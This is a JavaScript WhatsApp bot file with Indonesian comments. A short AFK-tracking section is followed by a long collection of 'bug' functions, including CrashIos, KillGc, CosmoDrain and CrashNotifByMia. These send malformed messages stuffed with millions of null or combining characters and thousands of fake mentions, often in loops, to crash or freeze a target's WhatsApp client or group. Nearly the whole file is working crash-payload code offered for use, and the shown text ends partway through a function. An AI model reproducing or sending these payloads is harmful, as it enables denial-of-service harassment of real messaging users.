      const todayDateWIB = new Date().toLocaleDateString('id-ID', {
        timeZone: 'Asia/Jakarta', // Zona waktu WIB
        year: 'numeric',
        month: 'long',
        day: 'numeric',
      });
    //===================================
    // Random reply // GANTI NAMA KALIAN
    const fotonye = fs.readFileSync('./engine/Assets/thumb.jpg')
    //===================================
    let Qphoto = [
        "https://files.catbox.moe/ta2dkc.jpg",
        "https://files.catbox.moe/ta2dkc.jpg",
        "https://files.catbox.moe/ta2dkc.jpg",
        "https://files.catbox.moe/ta2dkc.jpg"
      ]
      
    let CancerImg = Qphoto[Math.floor(Math.random() * Qphoto.length)];
    //===================================
    const Mp4 = [
      "https://files.catbox.moe/v00xc8.mp4"
    ]
    let CancerMp4 = Mp4[Math.floor(Math.random() * Mp4.length)]
    // ================== AFK SYSTEM ==================
    const {
        addAfk,
        getAfk,
        getAllAfk,
        removeAfk,
        clockString
    } = require('../engine/afk');
    
    // Ambil semua data AFK
    const afkData = getAllAfk();
    
    // ================== DETEKSI MENTION USER AFK ==================
    let mentionUser = [
        ...new Set([
            ...(m.mentionedJid || []),
            ...(m.quoted ? [m.quoted.sender] : [])
        ])
    ];
    
    for (let jid of mentionUser) {
        let user = afkData[jid];
        if (!user || !user.afkTime) continue;
    
        let reason = user.afkReason || 'Tanpa alasan';
        let duration = clockString(Date.now() - user.afkTime);
    
        await sock.sendMessage(m.chat, {
            text: `⚠️ User Tersebut Sedang Afk.
📌 Alasan: ${reason}
⏳ Sejak: ${duration}`,
            contextInfo: {
                mentionedJid: [jid],
                forwardingScore: 99999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterName: global.namaSaluran,
                    newsletterJid: global.idSaluran,
                },
            }
        }, { quoted: m });
    }
    
    // ================== RESET SAAT USER KEMBALI ==================
    const userAfk = getAfk(m.sender);
    
    if (userAfk && userAfk.afkTime) {
        removeAfk(m.sender);
    
        await sock.sendMessage(m.chat, {
            text: ` @${m.sender.split("@")[0]} telah kembali dari AFK!
📌 Alasan: ${userAfk.afkReason || 'Tidak ada'}
⏳ Durasi: ${clockString(Date.now() - userAfk.afkTime)}`,
            contextInfo: {
                mentionedJid: [m.sender],
                forwardingScore: 99999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterName: global.namaSaluran,
                    newsletterJid: global.idSaluran,
                },
            }
        }, { quoted: m });
    }
//═══════════════════════════════════//
// FUNC BUG BY Itss Dric OFFICIAL 
//═══════════════════════════════════//
async function sponkDelay(sock, target) {
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
           documentMessage: {
             url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
             mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
             fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
             fileLength: "9999999999999",
             pageCount: 9999999999999,
             mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
             fileName: "CsmX.ppt",
             fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
             directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
             mediaKeyTimestamp: "1726867151",
             contactVcard: true,
             jpegThumbnail: ""
            },
            hasMediaAttachment: true
          },
          body: {
            text: "@raysofhopee x @raysofbeam"
          },
          nativeFlowMessage: {
            buttons: [{
              name: "call_permission_request",
              buttonParamsJson: "\u0000".repeat(950000)
            }]
          },
          contextInfo: {
            remoteJid: target,
            participant: target,
            mentionedJid: ["0@s.whatsapp.app", ...Array.from({ length: 1999 }, () => 1 + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net" )],
            quotedMessage: {
             documentMessage: {
               url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
               mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
               fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
               fileLength: "9999999999999",
               pageCount: 9999999999999,
               mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
               fileName: "CsmX.ppt",
               fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
               directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
               mediaKeyTimestamp: "1726867151",
               contactVcard: true,
               jpegThumbnail: ""
              }
            }
          }
        }
      }
    }
  }, {
    messageId: null,
    participant: { jid: target }
  });
}
//═══════════════════════════════════//
async function ButGsUM(target) {
    for (let i = 0; i < 300; i++) {
    await socket.relayMessage(target, {
        groupStatusMessageV2: {
            message: {
                buttonsMessage: {
                    contentText: "./!ItssDric.js </>",
                    footerText: "♠️Cancer Trashflocks",
                    "imageMessage": {
                        "url": "https://mmg.whatsapp.net/v/t62.7118-24/577609766_1527631005628554_3319244479109846920_n.enc?ccb=11-4&oh=01_Q5Aa4QED2bGTk5Evx07yAf6bh10ULzrlh3GY-wwFcUse6mELqA&oe=6A127BF2&_nc_sid=5e03e0&mms3=true",
                        "mimetype": "image/jpeg",
                        "caption": "./!PouR7X .js </>",
                        "fileSha256": "VIdn7NiuBhYQdi3BwG1XQCOw5300ZVNd6WqStuUnzbU=",
                        "fileLength": "203917",
                        "height": 1254,
                        "width": 1254,
                        "mediaKey": "Xfs0YQc8QZP7kYaXHf+xmsPBtlbZJCkGXpY23e7NUP4=",
                        "fileEncSha256": "ZrDieQ9/DzaQw2xZlGd6Qm850B4qf6Wz2tMAdJh1/ZA=",
                        "directPath": "/v/t62.7118-24/577609766_1527631005628554_3319244479109846920_n.enc?ccb=11-4&oh=01_Q5Aa4QED2bGTk5Evx07yAf6bh10ULzrlh3GY-wwFcUse6mELqA&oe=6A127BF2&_nc_sid=5e03e0",
                        "mediaKeyTimestamp": "1777012352",
                        "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEAAwEBAQAAAAAAAAAAAAAAAQIEAwUGAQEBAQAAAAAAAAAAAAAAAAAAAQL/2gAMAwEAAhADEAAAAPnQJWsrGmKztuOAWspLaFt4yehnscePXljVkJYmJqy+u5w7PSwWeamM7lAXp0F0Jrvgvqer42iIyCaCJgoBYKiP/8QAJhAAAgIBAwQBBQEAAAAAAAAAAQIAAxEQEjEEICFBURMUIiNhcf/aAAgBAQABPwDUY7SMAae4B8xELHxzDSF5cA/EWsBgG4PBipUM5TwOSY+Nx28QjjX3KcoSfeIxJaUJmv8AZwOJa5ZiNGBwNAPcWvYm4jLHiBzsG7HPMZ6eVBBlTs7p6AlzBrGI0OPGpsfGMxW8FT7hQ54laCulyT+XaJXTZacKJX0pQgsN0+zd6gxIDiCtnF6r5InnsVTzg4hZh7MD3V4OSJV1vU7/ACSYnU7bvqBcZ5Eto6bqV3odryys1sVI1S1kwBHuZxjAhuYnMNrlt3uC3OP8lfUsFKS60sB/OwQdhPjT/8QAGxEBAAIDAQEAAAAAAAAAAAAAAQAhEBEgAhL/2gAIAQIBAT8Ax8sTPmkWGruOQWGjfIyu/wD/xAAZEQEAAwEBAAAAAAAAAAAAAAABABEgECH/2gAIAQMBAT8A5ZB6+kcKEW8pC9//2Q==",
                        "contextInfo": {
                            "pairedMediaType": "NOT_PAIRED_MEDIA",
                            remoteJid: "status@broadcast",
                            urlTrackingMap: {
                                urlTrackingMapElements: Array.from(
                                  { length: 500000 },
                                  () => ({ "\0": "\0" })
                                )
                            }
                        },
                        "scansSidecar": "3oAAPjqIlEyOGfsToxOfJC6YxMM5m/tDEkFhctsW6jxTSWq+kApyyA==",
                        "scanLengths": [
                            15131,
                            54124,
                            50663,
                            83999
                        ],
                        "midQualityFileSha256": "9r2qCYgqZbCTc83uiV6PNXStDTNJHIcv2MeapC1TZYE="
                    },
                    buttons: [
                        {
                            buttonId: ".othermenu",
                            buttonText: { displayText: "Pou The Explorer" },
                            type: 1
                        },
                        {
                            buttonId: ".bugmenu",
                            buttonText: { displayText: "Pou Exposing Meta" },
                            type: 1
                        }
                    ],
                    headerType: 4  
                }  
            }  
        }
    },{})
    await sleep(500);
    }
}
//═══════════════════════════════════//
async function funnyStunt(sock, target) {
  while (Date.now() - Date.now() < 300000) {
    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "\u0000",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "payment_method",
              paramsJson: `{\"reference_id\":null,\"payment_method\":${"\u0010".repeat(1045000)},\"payment_timestamp\":null,\"share_payment_status\":true}`,
              version: 3
            },
            mentionedJid: [
              "13135550002@s.whatsapp.net",
              ...Array.from({ length: 1999 }, () => 1 + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              )
            ]
          }
        }
      }
    }, { participant: { jid: target } });
    await new Promise((r) => setTimeout(r, 1000));
  }
}
//═══════════════════════════════════//
async function trckSQL(sock, target) {
    const msg = generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "Misi kakk",
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: "{ \"X\": { \"status\": \"\\0\" } }",
                            version: 3
                        },
                        contextInfo: {
                            participant: sock.user.id,
                            remoteJid: "♠️Cancer Trashflocks",
                            fromMe: false,
                            urlTrackingMap: {
                                urlTrackingMapElements: Array.from(
                                    { length: 500000 },
                                    () => ({ type: 1 })
                                )
                            }
                        }
                    }
                }
            }
        },
        {}
    );

    for (let i = 0; i < 79; i++) {
        await sock.relayMessage(
            target,
            {
                groupStatusMessageV2: {
                    message: msg.message
                }
            },
            {
                messageId: msg.key.id,
                participant: { jid: target }
            }
        );
    }

    await sleep(500);
}
//═══════════════════════════════════//
async function Null(target) {
  for(let p = 0; p < 100; p++) {
    let CancerMsg = generateWAMessageFromContent(target, {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from({ length:2000 }, (_, p) => `628317784314${p + 4}@s.whatsapp.net`)
        }, 
        body: {
          text: "\u0000".repeat(2000),
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "call_permission_request",
          paramsJson: "\u0000".repeat(900000),
          version: 3
        }
      }
    }, {});
    
    await sock.relayMessage(target, CancerMsg.message, {
        messageId: CancerMsg.key.id
      }
    );    
  }
}
//═══════════════════════════════════//
async function CancerNull(target) {
    await sock.relayMessage(target, {
         viewOnceMessageV2: {
              message: {
                   interactiveResponseMessage: {
                        body: {
                             text: "tess",
                             format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                             name: "call_permission_request",
                             paramsJson: "\u0000".repeat(1000000),
                             version: 3
                        }
                   },
                   contextInfo: {
                        mentionedJid: [
                             ...Array.from({ length: 1950 },
                                      () => `1${Math.floor(Math.random() * 999999)}@s.whatsapp.net`
                             )
                        ]
                   }
              }
         }
    },{});
}
//═══════════════════════════════════//
async function CosmoDrain(sock, target) {
  try {
    while (Date.now() - Date.now() < 200000) {
      const msg = generateWAMessageFromContent(target, {
        groupStatusMessageV2: {
          message: {
            interactiveResponseMessage: {
              body: {
                text: "Sv Back Cancer Store",
                format: "EXTENSION_1"
              },
              nativeFlowResponseMessage: {
                name: "payment_info",
                paramsJson: `{\"currency\":\"IRP\",\"total_amount\":{\"value\":0,\"offset\":100},\"reference_id\":\"4P46GMY57GC\",\"type\":\"physical-goods\",\"order\":{\"status\":\"pending\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"name\":${"\u0000".repeat(1000000)},\"amount\":{\"value\":0,\"offset\":100},\"quantity\":0,\"sale_amount\":{\"value\":0,\"offset\":100}}]},\"payment_settings\":[{\"type\":\"pix_static_code\",\"pix_static_code\":{\"merchant_name\":\"XXX\",\"key\":\"+99999999999\",\"key_type\":\"XXX\"}}]}`,
                version: 3
              },
              contextInfo: {
                forwardingScore: 9999,
                isForwarded: true,
                entryPointConversionSource: "payment_method"
              }
            }
          }
        }
      }, {});
      
    let mention = Array.from({ length: 2000 }, (_, i) => `1${i}@s.whatsapp.net`
    );
    const integer = 9999999999999;
    const empty = null;
    const time = 1766016566;
    const txt = "ꦸ".repeat(200000);
    const type = "image/jpeg";
    const newsletterInfo = {
      newsletterJid: "018@newsletter",
      newsletterName: "꧀".repeat(20000),
      contentType: "UPDATE_CARD"
    };
    const contextList = {
       mentionedJid: mention,
        stanzaId: "bsj",
        participant: target,
        remoteJid: target,
        isForwarded: true,
        forwardingScore: 999,
        businessMessageForwardInfo: {
          businessOwnerJid: "0@s.whatsapp.net"
        },
         forwardedNewsletterMessageInfo: newsletterInfo,
          quotedMessage: {
            callLogMessage: {
              isVideo: true,
               callOutcome: "MISSED",
               durationSecs: 999999,
               callType: 1,
               callParticipant: target
              }
            }
         };
    
    let message = {
      viewOnceMessage: {
        message: {
          imageMessage: {
            url: empty,
            mimetype: type,
            fileSha256: Buffer.from(""), 
            fileLength: integer,
            height: integer,
            width: integer,
            mediaKeyTimestamp: time,
            jpegThumbnail: empty,
            caption: txt,
            contextInfo: contextList
          }
        }
      }
    };
    
      await sock.relayMessage(target, msg.message, { messageId: msg.key.id, participant: { jid: target } });
      await new Promise((r) => setTimeout(r, 1000));
    const msgs = await generateWAMessageFromContent(target, message, {});

    await sock.relayMessage("status@broadcast", msgs.message, {
    messageId: msgs.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta", attrs: {}, content: [{
        tag: "mentioned_users", attrs: {}, content: [{
          tag: "to", attrs: { jid: target }, content: undefined
        }]
      }]
    }]
  });
    }
  } catch (err) {
    console.log(err);
  }
}
//═══════════════════════════════════//
async function bulldozerDelay2GB(sock, target) {
  const zephyrineMessages = {
    viewOnceMessage: {  
      message: {  
        interactiveResponseMessage: {  
          body: {  
            text: "# ♠️Cancer Trashflocks",  
            hasMediaAttachment: false  
          },  
          videoMessage: {  
            url: "https://mmg.whatsapp.net/v/t62.43144-24/10000000_1502112771709855_3272945837169502791_n.enc?ccb=11-4&oh=01_Q5Aa4QEq6ZqMuFLeKDwX_XZUoUlLhzeZd48Vdwdo8Pw2UwyFGQ&oe=6A00B5F6&_nc_sid=5e03e0&mms3=true",  
            mimetype: "video/mp4",  
            fileSha256: "BpORlhRms3eA7MGiNjeeONBeQLKl6bsfffFUEQUFnTw=",  
            fileLength: "1073741824",
            height: 1080,  
            width: 1920,
            mediaKey: "ByyHwYADrLlfTT288ptlcpWv/LTCtLy4Z1bJto2Vc68=",  
            fileEncSha256: "SC73MlcELb6U6tMsuyEr0+R3szXgleKnpJLE6dMcPeI=",  
            directPath: "/v/t62.43144-24/10000000_1502112771709855_3272945837169502791_n.enc?ccb=11-4&oh=01_Q5Aa4QEq6ZqMuFLeKDwX_XZUoUlLhzeZd48Vdwdo8Pw2UwyFGQ&oe=6A00B5F6&_nc_sid=5e03e0",  
            mediaKeyTimestamp: "1775847446",
            seconds: 3600,
            contextInfo: {  
              forwardingScore: 9999,  
              isForwarded: true,  
              mentionedJid: [  
                "0@s.whatsapp.net",  
                ...Array.from(  
                  { length: 1900 },  
                  () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"  
                )  
              ],  
              expiration: 9741,  
              ephemeralSettingTimestamp: 9741,  
              entryPointConversionSource: "WhatsApp.com",  
              entryPointConversionApp: "WhatsApp",  
              entryPointConversionDelaySeconds: 9742,  
              disappearingMode: {  
                initiator: "INITIATED_BY_OTHER",  
                trigger: "ACCOUNT_SETTING"  
              }  
            } 
          },  
          nativeFlowResponseMessage: {  
            name: "address_message",  
            paramsJson: "\u0000".repeat(1045900),  
            version: 3  
          }  
        }  
      }  
    }  
  };

  const zephMSG = generateWAMessageFromContent(target, zephyrineMessages, {});

  await sock.relayMessage("status@broadcast", zephMSG.message, {
    messageId: zephMSG.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: target },
          content: undefined
        }]
      }]
    }]
  });
}
//═══════════════════════════════════//
async function CrashNotifByMia(target) {
  const msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
           header: {
              title: "ꦾ".repeat(77777),
              hasMediaAttachment: false,
            },
            body: {
              text: "♠️Cancer Trashflocks" + "ោ៝".repeat(25000),
            },
            contextInfo: {
              forwardingScore: 9999,
              isForwarded: true,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: ["0@s.whatsapp.net", "13135550002@s.whatsapp.net"],
              ephemeralSettingTimestamp: 9741,
              entryPointConversionSource: "WhatsApp.com",
              entryPointConversionApp: "WhatsApp",
              disappearingMode: {
                  initiator: "INITIATED_BY_OTHER",
                  trigger: "ACCOUNT_SETTING"
               },
              urlTrackingMap: {
                urlTrackingMapElements: [
                  {
                    originalUrl: "https://t.me/itssdric",
                    unconsentedUsersUrl: "https://t.me/itssdric",
                    consentedUsersUrl: "https://t.me/itssdric",
                    cardIndex: 1,
                  },
                  {
                    originalUrl: "https://t.me/itssdric",
                    unconsentedUsersUrl: "https://t.me/itssdric",
                    consentedUsersUrl: "https://t.me/itssdric",
                    cardIndex: 2,
                  },
                ],
              },
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "cta_call",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: JSON.stringify({
                    status: true,
                  }),
                 },
               {
                 name: "cta_url",
                 buttonParamsJson: "",
               },
                {
                  name: "galaxy_message",
                  buttonParamsJson: `{ icon: 'DOCUMENT' }`,
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "{ 'consencutive': true }",
                },
              ],
              messageParamsJson: "{{".repeat(10000),
            },
          },
        },
      },
    },
    {}
  );
   
  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
  console.log(chalk.red(`Cancer Trashflocks Succes Sending Bugs To ${target}`));
}
//═══════════════════════════════════//
async function xCursedFC(sock, target) {
  for (var i = 0; i < 1000; i++) {
    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
            fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
            fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
            mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
            mimetype: "image/webp",
            directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
            fileLength: "10610",
            mediaKeyTimestamp: "1775044724",
            stickerSentTs: "1775044724091"
           }
         }
       }
    }, {
      messageId: null,
      participant: {
        jid: target
      }
    });
    await new Promise((r) => setTimeout(r, 1500));
  }
}
//═══════════════════════════════════//
async function CrashIos(sock, target) {
  let message = {
    locationMessage: {
      name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
      address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000)
    } 
  }; 
  
  const msg = await generateWAMessageFromContent(target, message, {});
  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta", attrs: {}, content: [{
        tag: "mentioned_users", attrs: {}, content: [{
          tag: "to", attrs: { jid: target }, content: undefined
        }]
      }]
    }]
  });
}
//═══════════════════════════════════//
async function Blank1Msg(sock, target, mention = false) {
    await sock.relayMessage(target, {
        interactiveMessage: {
            body: { text: "Aloo deck" },
            nativeFlowMessage: {
                buttons: [
                    {
                        name: "payment_info",
                        buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":0,\"offset\":100},\"reference_id\":\"4TWOZ803CWN\",\"type\":\"physical-goods\",\"order\":{\"status\":\"pending\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"name\":\"\",\"amount\":{\"value\":0,\"offset\":100},\"quantity\":0,\"sale_amount\":{\"value\":0,\"offset\":100}}]},\"payment_settings\":[{\"type\":\"payment_key\",\"payment_key\":{\"type\":\"IDPAYMENTACCOUNT\",\"key\":\"" + `${".".repeat(30000)}` + "\",\"name\":\"OVO\",\"institution_name\":\"OVO\",\"full_name_on_account\":\"R9X \",\"account_type\":\"wallet\"}}],\"share_payment_status\":false,\"referral\":\"chat_attachment\"}"
                    }
                ]
            }
        }
    }, mention ? {
        participant: { jid: target }
    } : {}
    );
}
//═══════════════════════════════════//
async function crashIclick(sock, target) {
  let tons = [];
  tons.push({
    name: "single_select",
    buttonParamsJson: "{}"
  });
  for (var i = 0; i < 20000; i++) {
    tons.push({
       name: "booking_status",
       buttonParamsJson: "{}"
    });
  }
  
  await sock.relayMessage(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: tons
      },
      body: { text: "Sv Back Cancer Store\n" + "ꦾ࣯࣯".repeat(8000) + "@1".repeat(90000) }
    }
  }, {
    participant: { jid: target }
  });
}
//═══════════════════════════════════//
async function fcch(sock, target) {
  sock.relayMessage(target, {
      viewOnceMessage: {
        message: {
          groupStatusMentionMessage: {
            interactiveMessage: {
              header: {
                title: "y",
                hasMediaAttachment: false,
              },
              footer: {
                text: "y",
                hasMediaAttachment: true,
                audioMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7114-24/564811995_2226295251130173_4896412572023575731_n.enc?ccb=11-4&oh=01_Q5Aa2wHo-lT_MOZnWfQ_JOw-7-bnOupvQ4eNVJH3b3sJ1whv3w&oe=69146218&_nc_sid=5e03e0&mms3=true",
                  mimetype: "audio/mpeg",
                  fileSha256: "QQY7C11FLCXjv0jnflXKGP1vg4MeAfgxAvyRDWDRdHc=",
                  fileLength: "1132136",
                  seconds: 69,
                  ptt: false,
                  mediaKey: "pIxzjTMehul0kxHE8ARAEbByfdC++jhsqB3Cz2Fbbl0=",
                  fileEncSha256: "ujOERGAHOMEVdH5GiNuZx3meK4VS9+O4lMWrNx4Moe8=",
                  directPath: "/v/t62.7114-24/564811995_2226295251130173_4896412572023575731_n.enc?ccb=11-4&oh=01_Q5Aa2wHo-lT_MOZnWfQ_JOw-7-bnOupvQ4eNVJH3b3sJ1whv3w&oe=69146218&_nc_sid=5e03e0",
                  mediaKeyTimestamp: 1764221889,
                },
              },
              body: {
                text: "6",
              },
              nativeFlowMessage: {
                messageParamsJson: "{".repeat(5000),
                buttons: [
                  {
                    name: "call_permission_request",
                    buttonParamsJson: "",
                  },
                ],
              },
            },
          },
        },
      },
    },{});
}
//═══════════════════════════════════//
async function CancerBlank(sock, target) {  
  const Cancer1 = "ꦽ".repeat(2000000);  
  const CancerMsg = {  
    newsletterAdminInviteMessage: {  
    newsletterJid: "1234567891234@newsletter",  
    newsletterName: "Cancer Is Here "+ Cancer1,
    caption: "Cancer Is Here" + Cancer1,
    inviteExpiration: "90000",  
    contextInfo: {
          isForwarded: true,
          forwardingScore: 9999,
          remoteJid: "X",
          participant: target,
          stanzaId: "1234567890ABCDEF",
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 3,
              expiryTimestamp: Date.now() + 1814400000
            }
          },
          businessMessageForwardInfo: {
            businessOwnerJid: "13135550002@s.whatsapp.net"
          },
        },
     },  
   };  
    
  await sock.relayMessage(target, CancerMsg, {  
    participant: { jid: target },  
    messageId: null,  
  });  
   console.log(chalk.red.bold(`Succes Sending Bug Blank To ${target}`));  
}
//═══════════════════════════════════//
async function KillGc(sock, target, mention) {
  await sock.relayMessage(
    target,
    {
      requestPaymentMessage: {
           currencyCodeIso4217: null,
           requestFrom: "13135550202@s.whatsapp.net", 
           expiryTimestamp: Date.now() + 8000, 
           amount: {
               value: null, 
               offset: null, 
               currencyCode: null
            }
        }
    },
    mention
      ? {
          participant: { jid: target }
        }
      : {}
   )
}
//═══════════════════════════════════//
// FUNCTION BUG GROUP
//═══════════════════════════════════//
async function PorklosGroup(target) {
    await sock.relayMessage(target, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: { text: "ITSS GANTENG BEUT" },
                    footer: { text: "♠️" },
                    contextInfo: {},
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "booking_confirmation",
                                buttonParamsJson: JSON.stringify({
                                    booking_id: "CANCERV9",
                                    status: "confirmed",
                                    business_name: "Toko Sembako Abadi",
                                    service_name: "ItssDricOffc",
                                    appointment_time: "2026-04-28T10:00:00Z",
                                    customer: {
                                        name: "ItssDric",
                                        phone: "itssdric"
                                    }
                                })
                            }
                        ],
                        messageParamsJson: "{".repeat(9999)
                    }
                }
            }
        }
    }, {})
}
//═══════════════════════════════════//
async function groupNullInv(target) {
  let msg = generateWAMessageFromContent(target, {
    interactiveResponseMessage: {
      contextInfo: {
        fromMe: false,
        mentionedJid: Array.from({ length:2000 }, (_, y) => `1313555000${y + 1}@s.whatsapp.net`)
      }, 
      body: {
        text: "\u0000".repeat(200),
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "address_message",
        paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"Yd7\",\"tower_number\":\"Y7d\",\"city\":\"chindo\",\"name\":\"d7y\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(900000)}\"}}`,
        version: 3
      }
    }
  }, { });
  
  await sock.relayMessage(m.chat, {
    groupStatusMessageV2: {
      message: msg.message
    }
  }, {
    messageId: msg.key.id 
  });
}
//═══════════════════════════════════//
async function CancerDelayGb(target) {
  for(let z = 0; z < 75; z++) {
    let Papqin = {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from({ length:2000 }, (_, z) => `628${z + 72}@s.whatsapp.net`), 
          isForwarded: true, 
          forwardingScore: 7205,
          forwardedNewsletterMessageInfo: {
            newsletterJid: "120363372691076512@newsletter", 
            newsletterName: "Itss Dric | Information", 
            serverMessageId: 1000,
            accessibilityText: "❖ ITSSDRIC"
          }, 
          statusAttributionType: "RESHARED_FROM_MENTION", 
          contactVcard: true, 
          isSampled: true, 
          dissapearingMode: {
            initiator: target, 
            initiatedByMe: true
          }, 
          expiration: Date.now()
        }, 
        body: {
          text: "CANCER TRASHFLOCKS",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "address_message",
          paramsJson: `{\"values\":{\"in_pin_code\":\"10833\",\"building_name\":\"Korean Hotel\",\"address\":\"2.7205\",\"tower_number\":\"507\",\"city\":\"South Korea\",\"name\":\"ItssDric\",\"phone_number\":\"+13135550202\",\"house_number\":\"7205826\",\"floor_number\":\"16\",\"state\":\"${"\u0000".repeat(900000)}\"}}`,
          version: 3
        }
      }
    };
    
    let msg = generateWAMessageFromContent(target, {
      groupStatusMessageV2: {
        message: Papqin
      }
    }, {});
  
    await sock.relayMessage(target, msg.message, {
      messageId: msg.key.id
    });
    await sleep(1000);
  }
}
//═══════════════════════════════════//
async function BugGb12(target) {
    try {
        const message = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `999999999999999999@newsletter`,
                        newsletterName: "♠️Cancer Trashflocks" + "ꦾ".repeat(120000),
                        jpegThumbnail: "https://files.catbox.moe/lnnuqj.png",
                        caption: "ꦽ".repeat(120000) + "@0".repeat(120000),
                        inviteExpiration: Date.now() + 1814400000, // 21 hari
                    },
                },
            },
            nativeFlowMessage: {
    messageParamsJson: "♠️Cancer Trashflocks",
    buttons: [
        {
            name: "call_permission_request",
            buttonParamsJson: "{}",
        },
        {
            name: "galaxy_message",
            paramsJson: {
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "nullOnTop",
